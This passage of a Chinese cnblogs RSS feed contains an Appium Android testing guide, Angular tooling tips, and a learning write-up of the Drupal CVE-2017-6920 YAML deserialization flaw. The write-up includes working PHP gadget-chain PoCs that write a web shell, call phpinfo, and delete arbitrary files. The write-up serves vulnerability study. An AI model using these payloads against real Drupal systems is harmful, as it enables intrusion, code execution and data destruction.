            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;platformName&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;deviceName&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;192.168.0.55:5556&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;platformVersion&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;5.1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; apk包名&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;appPackage&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;cn.campsg.xuebaketang3.app&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; apk的launcherActivity&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;appActivity&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;.MainActivity&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 键盘相关&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;unicodeKeyboard&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: True,
            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;resetKeyboard&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: True,
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 是否自动启动&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;autoLaunch&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: True,
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 可下载地址，如果测试机无该应用会自动进行下载安装操作&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: PATH(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;xuebayun.apk&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;),
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果测试机已有该应用，不再进行下载安装操作&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;noReset&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: True
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;打开appium，点击launch打开appium服务后，在pycharm上执行代码，测试机会自动执行&lt;/p&gt;

&lt;p&gt;四.安卓模拟器执行&lt;/p&gt;
&lt;p&gt;SDK文件夹，点击tools文件里的android文件 &lt;/p&gt;
&lt;p&gt;1.下载android版本，我这里下载的是5.1版本 &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/949572/201903/949572-20190307150411058-2119649922.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2.下载完成后，点击菜单栏如下，选择Manage AVDs&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/949572/201903/949572-20190307150452281-747344027.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3.点击create，创建模拟器，如图（具体配置可以自行百度）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/949572/201903/949572-20190307150620637-1863672222.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;4.点击start运行模拟器，此处一开始点击启动时，报了个未安装Intel HAXM的error，此时回到 Android SDK Mannager配置页，选择extras下如图的文件进行安装&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/949572/201903/949572-20190307150927390-1020116765.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下载成功后，我又试了下start模拟器，仍旧报错。&lt;/p&gt;
&lt;p&gt;此时进入SDK文件夹，多了个extras文件夹，点进去选择intel，一层层进入，会有个两个安装文件，如下图，我试了第1个未安装成功，点击第2个文件提示安装好后，进入系统安全性与隐私内，把系统阻拦的文件访问给允许（&lt;span&gt;就因为这个地方导致一直无法访问intel HAXM&lt;/span&gt;）&lt;/p&gt;
&lt;p&gt;之后，进入AVM配置页面，点击start，模拟器成功启动（特别慢，需要等很久时间），进入系统后显示如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/949572/201903/949572-20190307151432928-229768202.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;5.修改代码参数配置处，修改deviceName，模拟器设备名，可进入控制台输入:adb devices查看，如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/949572/201903/949572-20190307151552702-51829393.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;修改代码： &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/949572/201903/949572-20190307151633249-492249352.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;6.打开appium，点击launch，启动appium服务后，运行代码文件&lt;/p&gt;
&lt;p&gt;自动下载apk文件安装，并自动执行&lt;/p&gt;
&lt;p&gt;（注：模拟器过分卡顿，很容易出现应用闪退的情况，之后准备再试一下夜神模拟器上运行的情况）&lt;/p&gt;

&lt;p&gt;以上就是Appium自动化测试在真机和模拟器上的运行步骤，下一节，稍微写一下ios真机及ios模拟器自动运行应用的情况。&lt;/p&gt;

</description>
<pubDate>Thu, 07 Mar 2019 07:22:00 +0000</pubDate>
<dc:creator>浅浅水声</dc:creator>
<og:description>一.环境准备 appium-pythin-client版本（0.17），selenium版本（2.53.6）（版本需对应，否则执行脚本可能出错，我用的是这两个版本） macOs版本10.14.1（ap</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhuzhutest/p/10489873.html</dc:identifier>
</item>
<item>
<title>CVE-2017-6920 Drupal远程代码执行漏洞学习 - tr1ple</title>
<link>http://www.cnblogs.com/wfzWebSecuity/p/10480736.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wfzWebSecuity/p/10480736.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt; 1.背景介绍：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CVE-2017-6920是Drupal Core的YAML解析器处理不当所导致的一个远程代码执行漏洞，影响8.x的Drupal Core。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
Drupal介绍：&lt;br/&gt;Drupal 是一个由Dries Buytaert创立的自由开源的内容管理系统，用PHP语言写成。在业界Drupal常被视为内容管理框架（CMF），而非一般意义上的内容管理系统（CMS）。&lt;br/&gt;Drupal目录：&lt;br/&gt;/vendor – Drupal Core所依赖的后端库&lt;br/&gt;/profile – 贡献和自定义配置文件&lt;br/&gt;/libraries – 第三方库
&lt;/pre&gt;
&lt;pre&gt;
/core /lib – Drupal核心类&lt;br/&gt;/core /assets – Core使用的各种外部库&lt;br/&gt;/core /misc – Drupal Core所依赖的前端代码&lt;br/&gt;/core /includes – 低级别为模块化的功能。比如模块系统本身&lt;br/&gt;/core /modules – Drupal核心模块&lt;br/&gt;/core /profiles – Drupal Core安装配置文件&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
YAML 介绍:&lt;br/&gt;YAML是“YAML不是一种标记语言”的外语缩写，但为了强调这种语言以数据做为中心，而不是以置标语言为重点，而用返璞词重新命名。&lt;br/&gt;它是一种直观的能够被电脑识别的数据序列化格式，是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。&lt;br/&gt;它是类似于标准通用标记语言的子集XML的数据描述语言，语法比XML简单很多。
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;2.修复方法：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;$init&lt;/span&gt;&lt;span&gt;; 
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$init&lt;/span&gt;&lt;span&gt;)) 
{ &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; We never want to unserialize !php/object. &lt;/span&gt;
&lt;span&gt;ini_set&lt;/span&gt;('yaml.decode_php', 0&lt;span&gt;); 
&lt;/span&gt;&lt;span&gt;$init&lt;/span&gt; = &lt;span&gt;TRUE&lt;/span&gt;&lt;span&gt;; 
} &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;因为通过设置Init_set()，将限制yaml的decode函数的功能，从而防止反序列化php的对象类型序列化数据&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;3.漏洞分析：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;在yaml.php中存在以下decode函数的调用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190305232104208-1075532652.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以需要在yaml类所在的文件中找decode函数，此decode函数中调用了静态方法getSerializer()函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190305232534142-1184293140.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;此方法说明此时应用会判断用什么类来解析yaml数据，如果存在yaml扩展，就调用yamlpecl来处理，否则就使用yamlsymfony类来处理，此时要寻找的漏洞点&lt;/p&gt;
&lt;p&gt;需要满足调用了yaml类的decode函数并且传给decode函数的入口参数必须是我们可以控制的，所以需要去找这样的函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190305233603378-517368095.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在core/modules/config/src/Form/ConfigSingleImportForm.php中存在decode函数的调用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190305233739806-1604295402.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 这里调用了$form_stare的getValue()方法，这里要求我们必须熟悉drupal这个框架，知识储备：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
在处理表单时，有3个变量非常重要。&lt;br/&gt;第一个就是$form_id，它包含了一个标识表单的字符串。&lt;br/&gt;第二个就是$form，它是一个描述表单的结构化数组。&lt;br/&gt;第三个就是$form_state，它包含了表单的相关信息，比如表单的值以及当表单处理完成时应该发生什么。&lt;br/&gt;drupal_get_form()在开始时，首先会初始化$form_state。
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;说明$form_state变量将会存储我们在表单中提交的值，那么getValue是干啥的，我们继续跟进一下，在FormStateInterface.php中声明了getvalue函数的定义，具体的方法体在FormStateInterface.php中&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190306141036126-1974078052.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;此文件继承了FormStateInterface接口，并且使用了FormStateValuesTrait，此时又需要了解需要学trait&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
Trait 是为类似PHP 的单继承语言而准备的一种代码复用机制。Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用method。
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190306141222222-816421274.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在FormStateValuesTrait.php中实现了getvalue()函数的方法体,在getvalue()函数中，将会调用NestedArray的getvalue函数，将会把我们之前&quot;import&quot;键所对应的值返回，即此时yaml::decode就接收到我们传递过去的payload了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190306141708633-1323625527.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;4.本地测试：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;首先在其composer.json中寻找其加载了哪些代码库&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190306150324038-1057456192.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;1.存在guzzlehttp，因此可以利用其进行任意写文件，Guzzlehttp/guzzle代码库所存在的file_put_contents()&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php

&lt;/span&gt;&lt;span&gt;require&lt;/span&gt; __DIR__.'/vendor/autoload.php'&lt;span&gt;;


&lt;/span&gt;&lt;span&gt;use&lt;/span&gt;&lt;span&gt; GuzzleHttp\Cookie\FileCookieJar;
&lt;/span&gt;&lt;span&gt;use&lt;/span&gt; GuzzleHttp\Cookie\&lt;span&gt;SetCookie&lt;/span&gt;&lt;span&gt;;


&lt;/span&gt;&lt;span&gt;$tr1ple&lt;/span&gt; = &lt;span&gt;new&lt;/span&gt; FileCookieJar('/tmp/shell.txt'&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;$payload&lt;/span&gt; = '&amp;lt;?php echo system($_POST[\'cmd\']); ?&amp;gt;'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;$data&lt;/span&gt;=&lt;span&gt;array&lt;/span&gt;&lt;span&gt;(
    &lt;/span&gt;'Name' =&amp;gt; &quot;tr1ple&quot;,
    'Value' =&amp;gt; &quot;Arybin&quot;,
    'Domain' =&amp;gt; &lt;span&gt;$payload&lt;/span&gt;,
    'Expires' =&amp;gt; &lt;span&gt;time&lt;/span&gt;&lt;span&gt;()
);
&lt;/span&gt;&lt;span&gt;$tr1ple&lt;/span&gt;-&amp;gt;&lt;span&gt;setCookie&lt;/span&gt;(&lt;span&gt;new&lt;/span&gt; &lt;span&gt;SetCookie&lt;/span&gt;(&lt;span&gt;$data&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;file_put_contents&lt;/span&gt;('./exp',&lt;span&gt;addslashes&lt;/span&gt;(&lt;span&gt;serialize&lt;/span&gt;(&lt;span&gt;$tr1ple&lt;/span&gt;)));
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;导出到文件因为直接写出来会有不可见字符, 写在tmp目录是因为所使用的docker环境，写入文件到www下权限不对，序列化后的数据必须对其中的引号进行转义&lt;/p&gt;
&lt;p&gt;结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190306150948848-558012302.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;注意：payload前面需要加上yaml的&lt;code&gt;!php/object&lt;/code&gt; tag(注意一定要转义)，并且因为$data字段有Expire键，因此payload过一段时间将会失效，所以再次利用时需要重新生成payload&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
Expires：&lt;br/&gt;Cookie 过期的时间。这是个 Unix 时间戳，即从 Unix 纪元开始的秒数。　　
换而言之，通常用 time() 函数再加上秒数来设定 cookie 的失效期。
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;2.利用Guzzlehttp/psr中的FnStream&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190307090448175-701373413.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上图所示，在析构函数中，将会调用call_user_func()函数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
call_user_func — 把第一个参数作为回调函数调用
第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;而此时call_user_func()的入口参数只有一个，那么我们此时只能调用无参函数来测试，我们看一下其构造方法，入口参数为数组，并且将会遍历数组，将数组的键名前添加“_fn_”前缀，因为我们需要传递array(&quot;close&quot;=&amp;gt;&quot;phpinfo&quot;)作为入口参数&lt;/p&gt;
&lt;p&gt;-&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190307091544458-2056222364.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;poc如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;require&lt;/span&gt; __DIR__.&quot;/vendor/autoload.php&quot;&lt;span&gt;;



&lt;/span&gt;&lt;span&gt;use&lt;/span&gt;&lt;span&gt; GuzzleHttp\Psr7\FnStream;

&lt;/span&gt;&lt;span&gt;$payload&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;&lt;span&gt;(
&lt;/span&gt;&quot;close&quot; =&amp;gt; &quot;phpinfo&quot;&lt;span&gt;
);
&lt;/span&gt;&lt;span&gt;$tr1ple&lt;/span&gt; = &lt;span&gt;new&lt;/span&gt; FnStream(&lt;span&gt;$payload&lt;/span&gt;&lt;span&gt;);

&lt;/span&gt;&lt;span&gt;file_put_contents&lt;/span&gt;(&quot;exp1&quot;,&lt;span&gt;addslashes&lt;/span&gt;(&lt;span&gt;serialize&lt;/span&gt;(&lt;span&gt;$tr1ple&lt;/span&gt;)));
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190307093646427-2114237442.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190307123413731-2088163393.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190307122917411-1698679739.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;



&lt;p&gt;3.利用/vendor/symfony/process/Pipes/WindowsPipes.php中的unlink导致任意删除&lt;/p&gt;
&lt;p&gt;在其89行的析构函数中，存在removeFiles()函数，我们跟进一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190307124739193-1158527554.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在196行中我们可以看到这个函数将会遍历$files变量，取出文件名，然后将文件删除，而files变量是类的私有成员变量&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190307125009688-1276862067.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201903/1063309-20190307125229697-1343561275.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; poc为：&lt;/p&gt;
&lt;p&gt;这个poc并没有用到use，因为我们不需要导入windowspipes这个类，我们只需要在实例化这个类后给其私有变量赋值即可，也就是不存在给其构造函数传递参数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
namespace Symfony\Component\Process\Pipes;
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; WindowsPipes{
&lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;$files&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;('/tmp/tr1ple.txt'&lt;span&gt;);
}
&lt;/span&gt;&lt;span&gt;$tr1ple&lt;/span&gt; = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; WindowsPipes();
&lt;/span&gt;&lt;span&gt;file_put_contents&lt;/span&gt;(&quot;exp3&quot;,&lt;span&gt;addslashes&lt;/span&gt;(&lt;span&gt;serialize&lt;/span&gt;(&lt;span&gt;$tr1ple&lt;/span&gt;)));
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;reference：&lt;/p&gt;
&lt;p&gt;1.https://paper.seebug.org/334/&lt;/p&gt;
&lt;p&gt;感想：&lt;/p&gt;
&lt;p&gt;　　第一次尝试着去针对CVE去熟悉一个cms框架，这种学习的方法的确让人短时间了解了很多我之前都不会的知识，从接受恶意输入，到触发漏洞函数整个流程，非常可惜的一点是由于测试使用的是docker上的环境，&lt;/p&gt;
&lt;p&gt;我想使用断点调试，但是调试docker里面的php配置起来太麻烦了，并且网上的方法不适用与目前的环境，还是自己对docker的使用不够熟悉，折腾了半天还是没能搭建成调试环境。但是也体会到开发中常用的开发技巧，&lt;/p&gt;
&lt;p&gt;以及想要挖掘漏洞，除了需要掌握安全知识，也需要掌握一定的开发知识。&lt;/p&gt;

</description>
<pubDate>Thu, 07 Mar 2019 07:08:00 +0000</pubDate>
<dc:creator>tr1ple</dc:creator>
<og:description>1.背景介绍： CVE-2017-6920是Drupal Core的YAML解析器处理不当所导致的一个远程代码执行漏洞，影响8.x的Drupal Core。 2.修复方法： 因为通过设置Init_se</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wfzWebSecuity/p/10480736.html</dc:identifier>
</item>
<item>
<title>Angular开发技巧 - Worktile</title>
<link>http://www.cnblogs.com/worktile/p/10489745.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/worktile/p/10489745.html</guid>
<description>&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
由于之前有幸去参加了ngChina2018开发者大会，听了will保哥分享了Angular开发技巧，自己接触Angular也有差不多快一年的时间了，所以打算对Angular开发中的一些技巧做一个整理
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;-&quot;&gt;工具篇&lt;/h3&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
所谓 “工欲善其事，必先利其器”，下面我会介绍 如何打磨 `VS Code` 这把利器
&lt;/pre&gt;&lt;/div&gt;
&lt;ol readability=&quot;13.858709960509&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;抛弃 &lt;span class=&quot;cnblogs_code&quot;&gt;资源管理器&lt;/span&gt;  ，使用快捷键  &lt;span class=&quot;cnblogs_code&quot;&gt;Commd + P&lt;/span&gt;  来查找文档，默认会展示最近打开的文档，并且支持模糊搜索文件&lt;/p&gt;

&lt;center class=&quot;unindent&quot;&gt;&lt;img src=&quot;https://wt-box.worktile.com/public/8721c06f-10b0-4a7b-ac6a-df8051577bf4&quot; alt=&quot;222.png&quot; width=&quot;750px&quot;/&gt;&lt;/center&gt;

&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;快速打开最近文档：前进  &lt;span class=&quot;cnblogs_code&quot;&gt;Ctrl+➕&lt;/span&gt;  后退  &lt;span class=&quot;cnblogs_code&quot;&gt;Ctrl+➖&lt;/span&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;灵活使用VS Code重构功能，可以通过快捷键  &lt;span class=&quot;cnblogs_code&quot;&gt;Command +&lt;/span&gt;  对代码进行重构&lt;/p&gt;

&lt;center class=&quot;unindent&quot;&gt;&lt;img src=&quot;https://wt-box.worktile.com/public/7956e574-3212-492d-aea3-0adfe32b3637&quot; alt=&quot;333.png&quot; width=&quot;750px&quot;/&gt;&lt;/center&gt;

&lt;/li&gt;
&lt;li readability=&quot;10.185136897001&quot;&gt;
&lt;p&gt;安装插件  &lt;span class=&quot;cnblogs_code&quot;&gt;Angular Extension Pack&lt;/span&gt;  (认准will保哥出品)，这个插件集成了很多提升Angular开发效率的插件，比如：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
在 TS中实用 `ng-import-*` 导入常见的类
模板编辑的时候实用 ` a-*** `  快速使用Angular的组件和指令 （Angular v7 Snippets）
实用 ` ng-* ` 来生成常用的ng代码段，创建 Component，Directive 等 （Angular Snippets）
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;通过快捷键把JSON转换成TS类&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:erlang;gutter:true;&quot;&gt;
Ctrl+Alt+V 把粘贴板中的JSON 转为 Typescript
Ctrl+Alt+S 将选中的JSON 生成对应的 Typescript
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;还有一个值得一提的一个比较实用的功能，通过快捷键来  &lt;span class=&quot;cnblogs_code&quot;&gt;快速切换组件对应的不同的文件&lt;/span&gt; (Angular2-switcher)&lt;/p&gt;

&lt;center class=&quot;unindent&quot;&gt;&lt;img src=&quot;https://wt-box.worktile.com/public/ef083f3d-a628-4709-aa6c-7e9ff2c43014&quot; alt=&quot;e5dc25f8-a0ec-4706-919a-aa19194a7017.png&quot; width=&quot;750px&quot;/&gt;&lt;/center&gt;

&lt;p&gt;还有很多其他功能，插件中有详细介绍 &lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=doggy8088.angular-extension-pack&quot; rel=&quot;nofollow&quot;&gt;`Angular Extension Pack&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;安装插件  &lt;span class=&quot;cnblogs_code&quot;&gt;Clipboard History&lt;/span&gt;  , 这个插件会存储你最近的拷贝的记录，方便记录和粘贴最近几次的拷贝内容&lt;/p&gt;

&lt;center class=&quot;unindent&quot;&gt;&lt;img src=&quot;https://wt-box.worktile.com/public/561dae06-4d74-4202-9092-b4359a944dde&quot; alt=&quot;111.png&quot; width=&quot;750px&quot;/&gt;&lt;/center&gt;

&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;安装插件  &lt;span class=&quot;cnblogs_code&quot;&gt;Local History&lt;/span&gt;  ，这个插件用于维护文件的本地历史记录。每次修改文件时，旧内容的副本都会保留在本地历史记录中，你可以随时将文件与历史记录中的任何旧版本进行比较，如果发生意外时，可以帮助我们恢复丢失的内容，需要注意的是它会生成一个  &lt;span class=&quot;cnblogs_code&quot;&gt;.history&lt;/span&gt;  的文件夹进行本地修改的备份，所以我们需要再  &lt;span class=&quot;cnblogs_code&quot;&gt;.gitignore&lt;/span&gt;  排除这个文件夹，避免将其提交到git仓储。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;安装插件  &lt;span class=&quot;cnblogs_code&quot;&gt;Prettier - Code formatter&lt;/span&gt; ，这是一个代码格式化的插件，用过几个格式化的插件，个人感觉最好用的一个，更适合Angular开发&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;安装 Chrome 插件  &lt;span class=&quot;cnblogs_code&quot;&gt;Angular Angury&lt;/span&gt; 进行调试工作，可以查看 Component 的 State，Router Tree，NgModules的一些状态 （这个插件在复杂项目中并不是特别好用，包括对一些动态组件的支持比较差，但是在一些简单的项目中，或者新手在学习的时候安装这个插件比较方便调试排错）&lt;/p&gt;

&lt;center class=&quot;unindent&quot;&gt;&lt;img src=&quot;https://wt-box.worktile.com/public/7deefe38-1ba0-450f-b3d7-67fb19d6a956&quot; alt=&quot;444.png&quot; width=&quot;750px&quot;/&gt;&lt;/center&gt;


&lt;center class=&quot;unindent&quot;&gt;&lt;img src=&quot;https://wt-box.worktile.com/public/279f3c0a-5a09-4998-8e62-ad4bf5614c89&quot; alt=&quot;555.png&quot; width=&quot;750px&quot;/&gt;&lt;/center&gt;

&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;-&quot;&gt;开发篇&lt;/h3&gt;
